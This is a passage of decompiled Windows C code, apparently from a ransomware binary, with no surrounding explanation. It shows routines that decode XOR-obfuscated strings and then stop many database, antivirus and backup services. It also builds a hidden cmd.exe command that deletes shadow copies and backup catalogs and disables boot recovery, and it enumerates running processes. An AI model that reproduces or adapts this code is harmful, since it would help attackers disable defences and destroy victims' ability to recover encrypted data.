          *(_DWORD *)&pbBuffer[v2] = _ESI;
        }
        while ( !_CF );
        ++v2;
      }
      while ( v2 < dwLen );
    }
    return 1;
  }
  strcpy(LibFileName, "bcrypt.dll");
  LibraryA = LoadLibraryA(LibFileName);
  if ( !LibraryA )
  {
    if ( !CryptAcquireContextW(&phProv, 0, szProvider, 1u, 0xF0000000) )
      return 0;
LABEL_8:
    if ( CryptGenRandom(phProv, dwLen, pbBuffer) )
      return 1;
    CryptReleaseContext(phProv, 0);
    return 0;
  }
  strcpy(ProcName, "BCryptGenRandom");
  ProcAddress = GetProcAddress(LibraryA, ProcName);
  if ( ProcAddress )
  {
    ((void (__stdcall *)(_DWORD, BYTE *, DWORD, int))ProcAddress)(0, pbBuffer, dwLen, 2);
    return 1;
  }
  else
  {
    result = CryptAcquireContextW(&phProv, 0, szProvider, 1u, 0xF0000000);
    if ( result )
      goto LABEL_8;
  }
  return result;
}
// 41D334: using guessed type int dword_41D334;

//----- (0040A8B0) --------------------------------------------------------
ULONG __stdcall sub_40A8B0(PVOID Parameter)
{
  char v1; // dl
  int v2; // ecx
  unsigned int v3; // ecx
  unsigned int v4; // ecx
  char v5; // dl
  int v6; // ecx
  unsigned int v7; // ecx
  unsigned int v8; // ecx
  unsigned int v9; // ecx
  unsigned int v10; // ecx
  unsigned int v11; // ecx
  char v12; // dl
  unsigned int v13; // ecx
  unsigned int v14; // ecx
  unsigned int v15; // ecx
  unsigned int v16; // ecx
  unsigned int v17; // ecx
  unsigned int v18; // ecx
  unsigned int v19; // ecx
  unsigned int v20; // ecx
  unsigned int v21; // ecx
  unsigned int v22; // ecx
  unsigned int v23; // ecx
  unsigned int v24; // ecx
  unsigned int v25; // ecx
  char v26; // dl
  unsigned int v27; // ecx
  int v28; // esi
  SC_HANDLE v29; // edi
  void (__stdcall *v30)(SC_HANDLE); // edi
  unsigned int v31; // ecx
  DWORD v32; // edx
  unsigned int v33; // ecx
  unsigned int v34; // ecx
  unsigned int v35; // ecx
  char v36; // dl
  unsigned int v37; // ecx
  char v38; // dl
  int v39; // ecx
  unsigned int v40; // ecx
  char v41; // dl
  unsigned int v42; // ecx
  unsigned int v43; // ecx
  unsigned int v44; // ecx
  unsigned int v45; // ecx
  unsigned int v46; // ecx
  char v47; // dl
  int v48; // ecx
  char v49; // dl
  int v50; // ecx
  unsigned int v51; // ecx
  unsigned int v52; // ecx
  unsigned int v53; // ecx
  unsigned int v54; // ecx
  int v55; // esi
  int v56; // edi
  unsigned int v57; // eax
  unsigned int v58; // ecx
  HMODULE ModuleHandleA; // eax
  FARPROC ProcAddress; // eax
  unsigned int v61; // ecx
  unsigned int v62; // ecx
  unsigned int v63; // ecx
  unsigned int v64; // esi
  char *v65; // esi
  unsigned int v66; // esi
  char *v67; // esi
  unsigned int v68; // esi
  char *v69; // esi
  unsigned int v70; // esi
  char *v71; // esi
  unsigned int v72; // esi
  char *v73; // esi
  unsigned int v74; // esi
  char *v75; // esi
  SC_HANDLE v76; // eax
  int v77; // esi
  void *v78; // eax
  bool v79; // zf
  unsigned int v80; // edi
  char *v81; // eax
  char *v82; // esi
  const CHAR *v83; // eax
  unsigned int v84; // edi
  char *v85; // eax
  char *v86; // esi
  unsigned int v87; // edi
  char *v88; // eax
  char *v89; // esi
  const CHAR *v90; // eax
  HMODULE v91; // eax
  FARPROC v92; // eax
  SC_HANDLE v94; // [esp-4h] [ebp-BF4h]
  LPCSTR v95; // [esp-4h] [ebp-BF4h]
  SC_HANDLE v96; // [esp-4h] [ebp-BF4h]
  LPCSTR v97; // [esp-4h] [ebp-BF4h]
  LPCSTR v98; // [esp-4h] [ebp-BF4h]
  const CHAR *v99; // [esp-4h] [ebp-BF4h]
  HANDLE hSnapshot; // [esp+10h] [ebp-BE0h]
  HANDLE hSnapshota; // [esp+10h] [ebp-BE0h]
  HANDLE hSnapshotb; // [esp+10h] [ebp-BE0h]
  HANDLE hSnapshotc; // [esp+10h] [ebp-BE0h]
  HANDLE hSnapshotd; // [esp+10h] [ebp-BE0h]
  HANDLE hSnapshote; // [esp+10h] [ebp-BE0h]
  HANDLE hSnapshotf; // [esp+10h] [ebp-BE0h]
  HANDLE hSnapshotg; // [esp+10h] [ebp-BE0h]
  SC_HANDLE hSCManager; // [esp+14h] [ebp-BDCh]
  char hSCManagerb; // [esp+14h] [ebp-BDCh]
  char hSCManagerc; // [esp+14h] [ebp-BDCh]
  char hSCManagerd; // [esp+14h] [ebp-BDCh]
  char hSCManagere; // [esp+14h] [ebp-BDCh]
  char hSCManagerf; // [esp+14h] [ebp-BDCh]
  char hSCManagerg; // [esp+14h] [ebp-BDCh]
  SC_HANDLE hSCManagera; // [esp+14h] [ebp-BDCh]
  char v116; // [esp+1Bh] [ebp-BD5h] BYREF
  char v117[9]; // [esp+1Ch] [ebp-BD4h] BYREF
  char v118; // [esp+25h] [ebp-BCBh] BYREF
  char v119[22]; // [esp+26h] [ebp-BCAh] BYREF
  char v120; // [esp+3Ch] [ebp-BB4h] BYREF
  char v121[24]; // [esp+3Dh] [ebp-BB3h] BYREF
  char v122; // [esp+55h] [ebp-B9Bh] BYREF
  char v123[27]; // [esp+56h] [ebp-B9Ah] BYREF
  char v124; // [esp+71h] [ebp-B7Fh] BYREF
  char v125[30]; // [esp+72h] [ebp-B7Eh] BYREF
  char v126; // [esp+90h] [ebp-B60h] BYREF
  char v127[34]; // [esp+91h] [ebp-B5Fh] BYREF
  char v128; // [esp+B3h] [ebp-B3Dh] BYREF
  char v129[37]; // [esp+B4h] [ebp-B3Ch] BYREF
  char v130; // [esp+D9h] [ebp-B17h] BYREF
  char v131[48]; // [esp+DAh] [ebp-B16h] BYREF
  __int16 v132; // [esp+10Ah] [ebp-AE6h]
  void *v133; // [esp+10Ch] [ebp-AE4h]
  _BYTE v134[18]; // [esp+111h] [ebp-ADFh] BYREF
  char v135[19]; // [esp+123h] [ebp-ACDh] BYREF
  char v136[19]; // [esp+136h] [ebp-ABAh] BYREF
  char v137[9]; // [esp+149h] [ebp-AA7h] BYREF
  char v138[9]; // [esp+152h] [ebp-A9Eh] BYREF
  char v139[8]; // [esp+15Bh] [ebp-A95h] BYREF
  char v140[19]; // [esp+163h] [ebp-A8Dh] BYREF
  char v141[9]; // [esp+176h] [ebp-A7Ah] BYREF
  char v142[9]; // [esp+17Fh] [ebp-A71h] BYREF
  char v143[19]; // [esp+188h] [ebp-A68h] BYREF
  char v144[7]; // [esp+19Bh] [ebp-A55h] BYREF
  char v145[10]; // [esp+1A2h] [ebp-A4Eh] BYREF
  char v146[11]; // [esp+1ACh] [ebp-A44h] BYREF
  char v147[7]; // [esp+1B7h] [ebp-A39h] BYREF
  char v148[10]; // [esp+1BEh] [ebp-A32h] BYREF
  char v149[11]; // [esp+1C8h] [ebp-A28h] BYREF
  char v150[20]; // [esp+1D3h] [ebp-A1Dh] BYREF
  _BYTE v151[19]; // [esp+1E7h] [ebp-A09h] BYREF
  _BYTE v152[20]; // [esp+1FAh] [ebp-9F6h] BYREF
  _BYTE v153[20]; // [esp+20Eh] [ebp-9E2h] BYREF
  char v154[18]; // [esp+222h] [ebp-9CEh] BYREF
  char v155[12]; // [esp+234h] [ebp-9BCh] BYREF
  char v156[21]; // [esp+240h] [ebp-9B0h] BYREF
  char v157[11]; // [esp+255h] [ebp-99Bh] BYREF
  char v158[11]; // [esp+260h] [ebp-990h] BYREF
  char v159[11]; // [esp+26Bh] [ebp-985h] BYREF
  char v160[11]; // [esp+276h] [ebp-97Ah] BYREF
  char v161[11]; // [esp+281h] [ebp-96Fh] BYREF
  char v162[11]; // [esp+28Ch] [ebp-964h] BYREF
  char v163[7]; // [esp+297h] [ebp-959h] BYREF
  char v164[12]; // [esp+29Eh] [ebp-952h] BYREF
  char v165[12]; // [esp+2AAh] [ebp-946h] BYREF
  char v166[13]; // [esp+2B6h] [ebp-93Ah] BYREF
  _BYTE v167[19]; // [esp+2C3h] [ebp-92Dh] BYREF
  char v168[20]; // [esp+2D6h] [ebp-91Ah] BYREF
  char v169[6]; // [esp+2EAh] [ebp-906h] BYREF
  _DWORD v170[3]; // [esp+2F0h] [ebp-900h] BYREF
  char v171; // [esp+2FCh] [ebp-8F4h]
  char v172[13]; // [esp+2FDh] [ebp-8F3h] BYREF
  char v173[14]; // [esp+30Ah] [ebp-8E6h] BYREF
  char v174[7]; // [esp+318h] [ebp-8D8h] BYREF
  char v175[7]; // [esp+31Fh] [ebp-8D1h] BYREF
  char v176[7]; // [esp+326h] [ebp-8CAh] BYREF
  char v177[7]; // [esp+32Dh] [ebp-8C3h] BYREF
  char v178[7]; // [esp+334h] [ebp-8BCh] BYREF
  _DWORD v179[3]; // [esp+33Bh] [ebp-8B5h] BYREF
  __int16 v180; // [esp+347h] [ebp-8A9h]
  int v181[3]; // [esp+349h] [ebp-8A7h] BYREF
  __int16 v182; // [esp+355h] [ebp-89Bh]
  char v183[15]; // [esp+357h] [ebp-899h] BYREF
  char v184[15]; // [esp+366h] [ebp-88Ah] BYREF
  int v185; // [esp+375h] [ebp-87Bh] BYREF
  char v186[11]; // [esp+379h] [ebp-877h] BYREF
  void *v187; // [esp+384h] [ebp-86Ch]
  __int128 v188; // [esp+38Bh] [ebp-865h] BYREF
  int v189; // [esp+39Bh] [ebp-855h]
  _BYTE v190[7]; // [esp+39Fh] [ebp-851h] BYREF
  char v191; // [esp+3A6h] [ebp-84Ah]
  char v192; // [esp+3A7h] [ebp-849h]
  char v193; // [esp+3A8h] [ebp-848h]
  char v194; // [esp+3A9h] [ebp-847h]
  char v195; // [esp+3AAh] [ebp-846h]
  char v196; // [esp+3ABh] [ebp-845h]
  char v197; // [esp+3ACh] [ebp-844h]
  char v198; // [esp+3ADh] [ebp-843h]
  __int16 v199; // [esp+3AEh] [ebp-842h]
  int v200; // [esp+3B0h] [ebp-840h] BYREF
  DWORD pcbBytesNeeded; // [esp+3B4h] [ebp-83Ch] BYREF
  __int128 v202; // [esp+3B8h] [ebp-838h] BYREF
  int v203; // [esp+3C8h] [ebp-828h]
  int v204; // [esp+3CCh] [ebp-824h]
  int v205; // [esp+3D0h] [ebp-820h]
  __int16 v206; // [esp+3D4h] [ebp-81Ch]
  char v207; // [esp+3D6h] [ebp-81Ah]
  CHAR v208[16]; // [esp+3D7h] [ebp-819h] BYREF
  char v209[15]; // [esp+3E7h] [ebp-809h] BYREF
  __int128 v210; // [esp+3F6h] [ebp-7FAh] BYREF
  int v211; // [esp+406h] [ebp-7EAh]
  int v212; // [esp+40Ah] [ebp-7E6h]
  int v213; // [esp+40Eh] [ebp-7E2h]
  __int128 v214; // [esp+412h] [ebp-7DEh] BYREF
  char v215[11]; // [esp+422h] [ebp-7CEh] BYREF
  __int128 v216; // [esp+42Dh] [ebp-7C3h] BYREF
  int v217; // [esp+43Dh] [ebp-7B3h]
  int v218; // [esp+441h] [ebp-7AFh]
  char v219; // [esp+445h] [ebp-7ABh]
  __int128 v220; // [esp+446h] [ebp-7AAh] BYREF
  int v221; // [esp+456h] [ebp-79Ah]
  int v222; // [esp+45Ah] [ebp-796h]
  char v223[24]; // [esp+45Eh] [ebp-792h] BYREF
  __int128 v224; // [esp+476h] [ebp-77Ah] BYREF
  int v225; // [esp+486h] [ebp-76Ah]
  int v226; // [esp+48Ah] [ebp-766h]
  __int128 v227; // [esp+48Eh] [ebp-762h] BYREF
  int v228; // [esp+49Eh] [ebp-752h]
  char v229[3]; // [esp+4A2h] [ebp-74Eh] BYREF
  __int128 v230; // [esp+4A5h] [ebp-74Bh] BYREF
  int v231; // [esp+4B5h] [ebp-73Bh]
  char v232[3]; // [esp+4B9h] [ebp-737h] BYREF
  __int128 v233; // [esp+4BCh] [ebp-734h] BYREF
  int v234; // [esp+4CCh] [ebp-724h]
  __int16 v235; // [esp+4D0h] [ebp-720h]
  char v236; // [esp+4D2h] [ebp-71Eh]
  __int128 v237; // [esp+4D3h] [ebp-71Dh] BYREF
  int v238; // [esp+4E3h] [ebp-70Dh]
  char v239[3]; // [esp+4E7h] [ebp-709h] BYREF
  __int128 v240; // [esp+4EAh] [ebp-706h] BYREF
  char v241[23]; // [esp+4FAh] [ebp-6F6h] BYREF
  char v242[23]; // [esp+501h] [ebp-6EFh] BYREF
  __int128 v243; // [esp+518h] [ebp-6D8h] BYREF
  int v244; // [esp+528h] [ebp-6C8h]
  __int128 v245; // [esp+52Ch] [ebp-6C4h] BYREF
  int v246; // [esp+53Ch] [ebp-6B4h]
  __int16 v247; // [esp+540h] [ebp-6B0h]
  __int128 v248; // [esp+542h] [ebp-6AEh] BYREF
  int v249; // [esp+552h] [ebp-69Eh]
  __int16 v250; // [esp+556h] [ebp-69Ah]
  __int128 v251; // [esp+558h] [ebp-698h] BYREF
  int v252; // [esp+568h] [ebp-688h]
  __int16 v253; // [esp+56Ch] [ebp-684h]
  __int128 v254; // [esp+56Eh] [ebp-682h] BYREF
  char v255[5]; // [esp+57Eh] [ebp-672h] BYREF
  __int128 v256; // [esp+583h] [ebp-66Dh] BYREF
  int v257; // [esp+593h] [ebp-65Dh]
  char v258; // [esp+597h] [ebp-659h]
  LPCSTR lpServiceName; // [esp+598h] [ebp-658h]
  char *v260; // [esp+59Ch] [ebp-654h]
  char *v261; // [esp+5A0h] [ebp-650h]
  char *v262; // [esp+5A4h] [ebp-64Ch]
  char *v263; // [esp+5A8h] [ebp-648h]
  char *v264; // [esp+5ACh] [ebp-644h]
  char *v265; // [esp+5B0h] [ebp-640h]
  char *v266; // [esp+5B4h] [ebp-63Ch]
  char *v267; // [esp+5B8h] [ebp-638h]
  char *v268; // [esp+5BCh] [ebp-634h]
  char *v269; // [esp+5C0h] [ebp-630h]
  char *v270; // [esp+5C4h] [ebp-62Ch]
  char *v271; // [esp+5C8h] [ebp-628h]
  int v272; // [esp+5CCh] [ebp-624h]
  char *v273; // [esp+5D0h] [ebp-620h]
  char *v274; // [esp+5D4h] [ebp-61Ch]
  char *v275; // [esp+5D8h] [ebp-618h]
  char *v276; // [esp+5DCh] [ebp-614h]
  char *v277; // [esp+5E0h] [ebp-610h]
  char *v278; // [esp+5E4h] [ebp-60Ch]
  char *v279; // [esp+5E8h] [ebp-608h]
  char *v280; // [esp+5ECh] [ebp-604h]
  char *v281; // [esp+5F0h] [ebp-600h]
  char *v282; // [esp+5F4h] [ebp-5FCh]
  char *v283; // [esp+5F8h] [ebp-5F8h]
  char *v284; // [esp+5FCh] [ebp-5F4h]
  char *v285; // [esp+600h] [ebp-5F0h]
  char *v286; // [esp+604h] [ebp-5ECh]
  char *v287; // [esp+608h] [ebp-5E8h]
  char *v288; // [esp+60Ch] [ebp-5E4h]
  char *v289; // [esp+610h] [ebp-5E0h]
  int v290; // [esp+614h] [ebp-5DCh]
  char *v291; // [esp+618h] [ebp-5D8h]
  int v292; // [esp+61Ch] [ebp-5D4h]
  _BYTE *v293; // [esp+620h] [ebp-5D0h]
  int v294; // [esp+624h] [ebp-5CCh]
  char *v295; // [esp+628h] [ebp-5C8h]
  int v296; // [esp+62Ch] [ebp-5C4h]
  char *v297; // [esp+630h] [ebp-5C0h]
  char *v298; // [esp+634h] [ebp-5BCh]
  int v299; // [esp+638h] [ebp-5B8h]
  int v300; // [esp+63Ch] [ebp-5B4h]
  char *v301; // [esp+640h] [ebp-5B0h]
  char *v302; // [esp+644h] [ebp-5ACh]
  int v303; // [esp+648h] [ebp-5A8h]
  int v304; // [esp+64Ch] [ebp-5A4h]
  char *v305; // [esp+650h] [ebp-5A0h]
  _BYTE *v306; // [esp+654h] [ebp-59Ch]
  _BYTE *v307; // [esp+658h] [ebp-598h]
  int v308; // [esp+65Ch] [ebp-594h]
  CHAR v309[16]; // [esp+664h] [ebp-58Ch] BYREF
  int v310; // [esp+674h] [ebp-57Ch]
  char v311[20]; // [esp+678h] [ebp-578h] BYREF
  CHAR v312[16]; // [esp+68Ch] [ebp-564h] BYREF
  int v313; // [esp+69Ch] [ebp-554h]
  void *v314; // [esp+6A0h] [ebp-550h]
  void *v315; // [esp+6A4h] [ebp-54Ch]
  void *v316; // [esp+6A8h] [ebp-548h]
  char v317[20]; // [esp+6AEh] [ebp-542h] BYREF
  char v318[20]; // [esp+6C2h] [ebp-52Eh] BYREF
  __int128 v319; // [esp+6D6h] [ebp-51Ah] BYREF
  char v320[3]; // [esp+6E6h] [ebp-50Ah] BYREF
  _OWORD v321[2]; // [esp+6E9h] [ebp-507h] BYREF
  int v322; // [esp+709h] [ebp-4E7h]
  int v323; // [esp+70Dh] [ebp-4E3h]
  int v324; // [esp+711h] [ebp-4DFh]
  __int16 v325; // [esp+715h] [ebp-4DBh]
  __int128 v326; // [esp+717h] [ebp-4D9h] BYREF
  __int16 v327; // [esp+727h] [ebp-4C9h]
  __int128 v328; // [esp+729h] [ebp-4C7h] BYREF
  __int16 v329; // [esp+739h] [ebp-4B7h]
  char v330[18]; // [esp+73Bh] [ebp-4B5h] BYREF
  __int128 v331; // [esp+74Dh] [ebp-4A3h] BYREF
  char v332; // [esp+75Dh] [ebp-493h]
  __int128 v333; // [esp+75Eh] [ebp-492h] BYREF
  __int128 v334; // [esp+76Eh] [ebp-482h] BYREF
  _OWORD v335[2]; // [esp+77Eh] [ebp-472h] BYREF
  int v336; // [esp+79Eh] [ebp-452h]
  int v337; // [esp+7A2h] [ebp-44Eh]
  _OWORD v338[3]; // [esp+7A6h] [ebp-44Ah] BYREF
  char v339[18]; // [esp+7D6h] [ebp-41Ah] BYREF
  int v340; // [esp+7E8h] [ebp-408h]
  DWORD dwMilliseconds; // [esp+7FCh] [ebp-3F4h]
  void *Src[10]; // [esp+808h] [ebp-3E8h]
  struct _PROCESS_INFORMATION ProcessInformation_4; // [esp+830h] [ebp-3C0h] BYREF
  CHAR ProcName[16]; // [esp+84Ch] [ebp-3A4h] BYREF
  __int128 v345; // [esp+85Ch] [ebp-394h]
  SHELLEXECUTEINFOA pExecInfo; // [esp+86Ch] [ebp-384h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+8A8h] [ebp-348h] BYREF
  __int128 v348; // [esp+8F7h] [ebp-2F9h] BYREF
  __int128 v349[3]; // [esp+907h] [ebp-2E9h] BYREF
  __int128 v350[3]; // [esp+937h] [ebp-2B9h] BYREF
  __int128 v351[3]; // [esp+967h] [ebp-289h] BYREF
  char v352[337]; // [esp+997h] [ebp-259h] BYREF
  CHAR CommandLine[264]; // [esp+AE8h] [ebp-108h] BYREF

  sub_40A220();
  v141[8] = 2;
  strcpy(v142, "wrapper");
  strcpy(v145, "|DefWatch");
  strcpy(v146, "WccEvtMgr");
  strcpy(v152, "PccSetMgr");
  strcpy(&v140[9], "dSavRoam");
  strcpy(&v135[9], "SSqlservr");
  strcpy(v148, ",sqlagent");
  strcpy(v149, "]sqladhlp");
  strcpy(v160, "&Culserver");
  strcpy(v134, "!RTVscan");
  strcpy(v155, "Tsqlbrowser");
  v149[10] = 11;
  strcpy(v150, "SQLADHLP");
  v1 = 7;
  v2 = 0;
  strcpy(v168, "\aVENCWTbuqndb");
  while ( 1 )
  {
    v168[v2 + 1] ^= v1;
    if ( (unsigned int)++v2 >= 0xC )
      break;
    v1 = v168[0];
  }
  v3 = 0;
  v168[13] = 0;
  v227 = xmmword_4191B0;
  v228 = 995298838;
  strcpy(v229, ">.");
  do
    *((_BYTE *)&v227 + ++v3) ^= v227;
  while ( v3 < 0x15 );
  v4 = 0;
  v229[2] = 0;
  v243 = xmmword_419220;
  v244 = 262664;
  do
    *((_BYTE *)&v243 + ++v4) ^= v243;
  while ( v4 < 0x12 );
  v142[8] = 12;
  strcpy(v143, "sqlwriter");
  strcpy(v140, "vmsmdsrv");
  strcpy(&v134[9], "Ktomcat6");
  HIBYTE(v244) = 0;
  v5 = 75;
  v6 = 0;
  strcpy(v184, "K1#>/$%,-*%,2>");
  while ( 1 )
  {
    v184[v6 + 1] ^= v5;
    if ( (unsigned int)++v6 >= 0xD )
      break;
    v5 = v184[0];
  }
  v7 = 0;
  v184[14] = 0;
  strcpy(v242, "^(3)?,;s+-<?,<7*?*1,hj");
  do
    v242[++v7] ^= v242[0];
  while ( v7 < 0x15 );
  v8 = 0;
  v242[22] = 0;
  strcpy(v330, "^(3)?,;s=10(;,*;,");
  do
    v330[++v8] ^= v330[0];
  while ( v8 < 0x10 );
  v138[8] = 23;
  strcpy(v139, "dbsrv12");
  strcpy(&v143[10], "Vdbeng8");
  v330[17] = 0;
  v9 = 0;
  v251 = xmmword_419870;
  v252 = 1953111582;
  v253 = 121;
  do
    *((_BYTE *)&v251 + ++v9) ^= v251;
  while ( v9 < 0x14 );
  v10 = 0;
  HIBYTE(v253) = 0;
  strcpy(v311, "}0..,1Y+88<0.,1OMLO");
  do
    v311[++v10] ^= v311[0];
  while ( v10 < 0x12 );
  v11 = 0;
  v311[19] = 0;
  v240 = xmmword_419360;
  strcpy(v241, "$9GEDG");
  do
    v241[v11++ - 15] ^= v240;
  while ( v11 < 0x15 );
  strcpy(v166, "eSQLBrowser");
  strcpy(v161, "_SQLWriter");
  v12 = 21;
  v241[6] = 0;
  v13 = 0;
  v185 = 1719423765;
  strcpy(v186, "}wzbyXlFDY");
  while ( 1 )
  {
    v186[v13++ - 3] ^= v12;
    if ( v13 >= 0xD )
      break;
    v12 = v185;
  }
  v14 = 0;
  v186[10] = 0;
  v245 = xmmword_4198B0;
  v246 = 1986534428;
  v247 = 123;
  do
    *((_BYTE *)&v245 + ++v14) ^= v245;
  while ( v14 < 0x14 );
  v140[18] = 8;
  strcpy(v141, "MySQL57");
  HIBYTE(v247) = 0;
  v15 = 0;
  v224 = xmmword_419950;
  v225 = 1836874623;
  v226 = 6716281;
  do
    *((_BYTE *)&v224 + ++v15) ^= v224;
  while ( v15 < 0x16 );
  v16 = 0;
  HIBYTE(v226) = 0;
  strcpy(v223, "\nGYY[FYox|oxKNBofzox;::");
  do
    v223[++v16] ^= v223[0];
  while ( v16 < 0x16 );
  v17 = 0;
  v223[23] = 0;
  v214 = xmmword_419410;
  strcpy(v215, "5+.'#$5!#>");
  do
    v215[v17++ - 15] ^= v214;
  while ( v17 < 0x19 );
  v18 = 0;
  v215[10] = 0;
  v319 = xmmword_419980;
  strcpy(v320, "sq");
  do
    v320[v18++ - 15] ^= v319;
  while ( v18 < 0x11 );
  v19 = 0;
  v320[2] = 0;
  v237 = xmmword_4199A0;
  v238 = 2088504332;
  strcpy(v239, "jj");
  do
    *((_BYTE *)&v237 + ++v19) ^= v237;
  while ( v19 < 0x15 );
  v20 = 0;
  v239[2] = 0;
  v256 = xmmword_4191F0;
  v257 = 504827915;
  v258 = 0;
  do
    *((_BYTE *)&v256 + ++v20) ^= v256;
  while ( v20 < 0x13 );
  v21 = 0;
  v258 = 0;
  v328 = xmmword_419660;
  v329 = 78;
  do
    *((_BYTE *)&v328 + ++v21) ^= v328;
  while ( v21 < 0x10 );
  v22 = 0;
  HIBYTE(v329) = 0;
  v202 = xmmword_419450;
  v203 = 521019240;
  v204 = 84017921;
  v205 = 85852952;
  v206 = 2818;
  v207 = 0;
  do
    *((_BYTE *)&v202 + ++v22) ^= v202;
  while ( v22 < 0x1D );
  v23 = 0;
  v207 = 0;
  v210 = xmmword_4193E0;
  v211 = 403769981;
  v212 = 369695755;
  v213 = 857872;
  do
    *((_BYTE *)&v210 + ++v23) ^= v210;
  while ( v23 < 0x1A );
  v24 = 0;
  HIBYTE(v213) = 0;
  v220 = xmmword_419110;
  v221 = 286005002;
  v222 = 265482;
  do
    *((_BYTE *)&v220 + ++v24) ^= v220;
  while ( v24 < 0x16 );
  v25 = 0;
  HIBYTE(v222) = 0;
  v254 = xmmword_419970;
  strcpy(v255, "ecd~");
  do
    v255[v25++ - 15] ^= v254;
  while ( v25 < 0x13 );
  v255[4] = 0;
  v26 = 111;
  v170[0] = 690830959;
  v27 = 0;
  v170[1] = 487210028;
  v170[2] = 168560153;
  v171 = 0;
  while ( 1 )
  {
    *((_BYTE *)v170 + ++v27) ^= v26;
    if ( v27 >= 0xB )
      break;
    v26 = v170[0];
  }
  v171 = 0;
  strcpy(v177, "RQBVSS");
  hSCManager = OpenSCManagerA(0, 0, 0xF003Fu);
  if ( !hSCManager && GetLastError() == 5 )
    goto LABEL_88;
  lpServiceName = v142;
  v260 = &v145[1];
  v261 = &v146[1];
  v262 = &v152[1];
  v263 = &v140[10];
  v264 = &v135[10];
  v265 = &v148[1];
  v266 = &v149[1];
  v267 = &v160[1];
  v268 = &v134[1];
  v269 = &v155[1];
  v270 = v150;
  v271 = &v168[1];
  v272 = (int)&v227 + 1;
  v273 = (char *)&v243 + 1;
  v274 = v143;
  v275 = &v140[1];
  v276 = &v134[10];
  v277 = &v184[1];
  v278 = &v242[1];
  v279 = &v330[1];
  v280 = v139;
  v281 = &v143[11];
  v282 = (char *)&v251 + 1;
  v283 = &v311[1];
  v284 = (char *)&v240 + 1;
  v285 = &v166[1];
  v286 = &v161[1];
  v287 = (char *)&v185 + 1;
  v288 = (char *)&v245 + 1;
  v289 = v141;
  v290 = (int)&v224 + 1;
  v291 = &v223[1];
  v292 = (int)&v214 + 1;
  v293 = (char *)&v319 + 1;
  v294 = (int)&v237 + 1;
  v295 = (char *)&v256 + 1;
  v296 = (int)&v328 + 1;
  v297 = (char *)&v202 + 1;
  v298 = (char *)&v210 + 1;
  v299 = (int)&v220 + 1;
  v300 = (int)&v254 + 1;
  v301 = (char *)v170 + 1;
  v303 = 0;
  v28 = 0;
  v302 = &v177[1];
  do
  {
    hSnapshot = (HANDLE)GetTickCount();
    v29 = OpenServiceA(hSCManager, (&lpServiceName)[v28], 0x2Cu);
    if ( !v29 )
      goto LABEL_85;
    if ( !QueryServiceStatusEx(v29, SC_STATUS_PROCESS_INFO, (LPBYTE)&v339[14], 0x24u, &pcbBytesNeeded) )
    {
LABEL_56:
      v94 = v29;
      v30 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
      CloseServiceHandle(v94);
      goto LABEL_86;
    }
    if ( v340 == 1 )
    {
      v31 = 0;
      *(_OWORD *)v312 = xmmword_419310;
      v313 = 658206;
      do
        v312[++v31] ^= v312[0];
      while ( v31 < 0x12 );
      v95 = (&lpServiceName)[v28];
      HIBYTE(v313) = 0;
      sub_4100C0(&v312[1], v95);
      v96 = v29;
      v30 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
      CloseServiceHandle(v96);
      goto LABEL_86;
    }
    if ( v340 == 3 )
    {
      while ( 1 )
      {
        v32 = dwMilliseconds / 0xA;
        if ( dwMilliseconds / 0xA >= 0x3E8 )
        {
          if ( v32 > 0x2710 )
            v32 = 10000;
        }
        else
        {
          v32 = 1000;
        }
        Sleep(v32);
        if ( !QueryServiceStatusEx(v29, SC_STATUS_PROCESS_INFO, (LPBYTE)&v339[14], 0x24u, &pcbBytesNeeded) )
          goto LABEL_72;
        if ( v340 == 1 )
          break;
        if ( GetTickCount() - (unsigned int)hSnapshot > 0x7530 )
          goto LABEL_72;
LABEL_73:
        if ( v340 != 3 )
          goto LABEL_74;
      }
      v33 = 0;
      *(_OWORD *)v309 = xmmword_4198C0;
      v310 = 8026990;
      do
        v309[++v33] ^= v309[0];
      while ( v33 < 0x12 );
      v97 = (&lpServiceName)[v28];
      HIBYTE(v310) = 0;
      sub_4100C0(&v309[1], v97);
LABEL_72:
      ++v28;
      CloseServiceHandle(v29);
      goto LABEL_73;
    }
LABEL_74:
    sub_40F310(v29, hSCManager);
    if ( !ControlService(v29, 1u, (LPSERVICE_STATUS)&v339[14]) )
      goto LABEL_56;
    if ( v340 == 1 )
      goto LABEL_85;
    while ( 1 )
    {
      Sleep(dwMilliseconds);
      if ( !QueryServiceStatusEx(v29, SC_STATUS_PROCESS_INFO, (LPBYTE)&v339[14], 0x24u, &pcbBytesNeeded) )
      {
LABEL_79:
        ++v28;
        CloseServiceHandle(v29);
        goto LABEL_80;
      }
      if ( v340 == 1 )
        break;
      if ( GetTickCount() - (unsigned int)hSnapshot > 0x7530 )
        goto LABEL_79;
LABEL_80:
      if ( v340 == 1 )
        goto LABEL_85;
    }
    v34 = 0;
    strcpy(v318, "[\b>)-28>{~({(/4++>?");
    do
      v318[++v34] ^= v318[0];
    while ( v34 < 0x12 );
    v98 = (&lpServiceName)[v28];
    v318[19] = 0;
    sub_4100C0(&v318[1], v98);
LABEL_85:
    v30 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
LABEL_86:
    ++v28;
  }
  while ( (&lpServiceName)[v28] );
  v30(hSCManager);
LABEL_88:
  CoInitializeEx(0, 6u);
  v348 = xmmword_419880;
  strcpy(v135, "8cmd.exe");
  qmemcpy(v349, "crc&ungbiqu&)gjj&)wsocr& &qkoe&u", 32);
  v349[2] = xmmword_4197C0;
  qmemcpy(v350, "& &debcbor&)ucr&}bc`gsjr{&diirur", 32);
  v350[2] = xmmword_419920;
  qmemcpy(v351, "cgjj`gojstcu& &debcbor&)ucr&}bc`", 32);
  v351[2] = xmmword_419840;
  strcpy(v352, "gdjcb&hi& &qdgbkoh&bcjcrc&egrgjia&+wsocr");
  v35 = 0;
  strcpy(v176, "Rrunas");
  do
    *((_BYTE *)&v348 + ++v35) ^= v348;
  while ( v35 < 0xC7 );
  v352[40] = 0;
  memset(&v352[45], 0, 0x124u);
  *(_DWORD *)&v352[41] = 296;
  hSnapshota = CreateToolhelp32Snapshot(2u, 0);
  Process32First(hSnapshota, (LPPROCESSENTRY32)&v352[41]);
  v166[12] = 29;
  strcpy(v167, "wxServer");
  v36 = 85;
  v37 = 0;
  v179[0] = 103621205;
  v179[1] = 807610160;
  v179[2] = 809239335;
  v180 = 34;
  while ( 1 )
  {
    *((_BYTE *)v179 + ++v37) ^= v36;
    if ( v37 >= 0xC )
      break;
    v36 = v179[0];
